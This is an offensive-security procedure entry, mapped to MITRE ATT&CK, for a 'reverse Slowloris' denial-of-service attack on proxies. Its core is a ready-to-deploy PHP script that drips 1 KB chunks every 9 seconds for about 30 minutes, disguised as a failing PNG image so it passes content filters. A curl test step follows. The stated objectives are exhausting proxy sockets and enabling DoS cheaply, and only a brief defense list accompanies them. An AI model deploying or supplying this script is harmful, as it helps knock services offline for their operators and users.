---
id: proc-create-slow-php-001
tags:
  - slowloris
  - php-script
  - dos
type: procedure
tools:
  - '[[tools/PHP]]'
tactics:
  - '[[Impact]]'
commands: []
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Network Denial of Service]]'
updated_at: '2025-12-14T17:26:48.946Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Network Denial of Service]]'
---
# Create-Slow-Response-PHP-Script

## Summary

This procedure creates a PHP script (slow.php) that sends small amounts of data periodically (every 9 seconds) using Transfer-Encoding: chunked, simulating a reverse Slowloris attack to tie up proxy connections for extended periods (up to 30 minutes).

## Description

The script outputs a few kB every 9 seconds for 200 iterations, totaling around 30 minutes, with HTTP 500 status and image/png content-type to mimic a faulty image fetch. This exploits proxies without timeouts on slow responses, exhausting sockets and concurrency.

## Requirements

1. PHP-enabled web server ([[procedures/Setup-Attacker-Web-Server-with-PHP]])
2. Access to /var/www/html for file placement
3. Large output buffer support in PHP

## Defense

Defensive measures and detection strategies:

- Enforce read timeouts on proxy backends (e.g., 30s)
- Limit concurrent connections per client/IP
- Detect periodic small chunk patterns in logs

## Objectives

1. Create a script that keeps proxy connections open indefinitely
2. Mimic image response to bypass content filters
3. Enable DoS with minimal attacker resources

## Instructions

### Step 1: Write the slow.php Script

**Context**: Generate the PHP code to handle chunked output with delays.

No command; create /var/www/html/slow.php with:

```php
<?php
ob_end_flush();
header('HTTP/1.1 500 Internal Server Error');
header('Content-Type: image/png');
header('Content-Length: 2097152');
header('Transfer-Encoding: chunked');
for($i=0; $i<200; $i++) {
    echo str_pad('data', 1024, ' ', STR_PAD_RIGHT);
    flush();
    sleep(9);
}
?>
```

> Expected output: When accessed, script sends chunks every 9s for ~30min.

### Step 2: Test the Script

**Context**: Verify slow response behavior.

Use curl http://attacker/slow.php -v

> Expected output: Headers show chunked, response pends with periodic data.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]] Impact

### Techniques

- [[Network Denial of Service]] Network Denial of Service

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/PHP]]

## Tags

- slowloris
- chunked
